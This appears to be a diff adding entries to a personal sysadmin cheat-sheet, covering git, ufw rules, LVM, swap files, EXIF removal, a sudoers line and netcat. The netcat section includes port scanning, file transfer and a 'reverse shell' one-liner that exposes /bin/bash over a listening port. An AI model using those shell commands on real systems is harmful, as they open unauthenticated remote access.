@@ -105,6 +105,17 @@ git push -u origin --all # for all!
 
 ```
 
+# cancel merge
+git reset --hard HEAD
+# or
+# git reset --hard ORIG_HEAD
+
+
+set default protocol
+```
+git config --global url."git@github.com:".insteadOf "https://github.com/"
+```
+
 
 ## aws s3
 
@@ -258,6 +269,7 @@ ufw allow from 91.207.249.7/32 to any port www
 ufw allow in on eth1 from any to any port www
 ufw allow in on eth1 from any to any proto tcp port 22
 
+ufw allow in on vmbr0
 ufw allow in on docker+
 ufw allow in on docker+ from any to any
 ufw allow in on tun+ from any
@@ -318,10 +330,83 @@ mdadm --fail /dev/md0 /dev/sda1 ; mdadm --remove /dev/md0 /dev/sda1 # remove /de
 mdadm --add /dev/md0 /dev/sda1 # add /dev/sda1 to /dev/md0
 ```
 
+## LVM
+create Physical Volume
+`pvcreate /dev/xda1`
+
+create Volume Group:
+`vgcreate vg-ssd /dev/xda1`
+
+create logical volume 300G on volume-group `vg-hdd`:
+```
+lvcreate --name base-backups -L300G vg-hdd
+
+```
+
+create "thin volume" data:
+```
+lvcreate -L 100G -n data pve
+lvconvert --type thin-pool pve/data
+```
+
 
 ## misc
 shift+numpad keys = home/end like in windows
 ```
 /etc/default/keyboard : XKBOPTIONS="numpad:microsoft" ?
 ```
+
+
+add swap
+```
+dd if=/dev/zero of=/swap bs=1G count=1; chmod go= /swap; mkswap /swap; echo "/swap swap  swap  sw  0 0" >>/etc/fstab ; swapon /swap
+```
+
+## img
+remove EXIF info
+```
+sudo apt install exiv2 jhead libimage-exiftool-perl
+
+exiftool -all= foo.jpg  # exiftool -geotag= foo.jpg
+# or
+jhead -purejpg foo.jpg
+# or
+exiv2 rm foo.jpg
+# or
+convert <input file> -strip <output file>
+
+```
+
+## sudo
+```
+deploy  ALL = NOPASSWD: /bin/systemctl
+```
+
+## netcat
+scan tcp ports
+`nc -vnz 192.168.1.100 20-24`
+
+scan udp ports
+`nc -vnzu 192.168.1.100 5550-5560`
+
+send udp packet
+`echo -n "foo" | nc -u -w1 192.168.1.100 161`
+
+send file
+`nc -lvp 5555           > /tmp/1.txt # remote`
+`nc 192.168.1.100 5555  < /tmp/1.txt # local`
+
+simple http server
+`while true; do nc -lp 8888 < index.html; done`
+
+reverse shell
+`nc -e /bin/bash -lp 4444 # remote`
+`nc 192.168.1.100 4444    # local`
+
+
+## golang
+go install without vendor
+`go install $(go list ./... | grep -v vendor/)`
+or for glide
+`go install $(glide nv)`
 
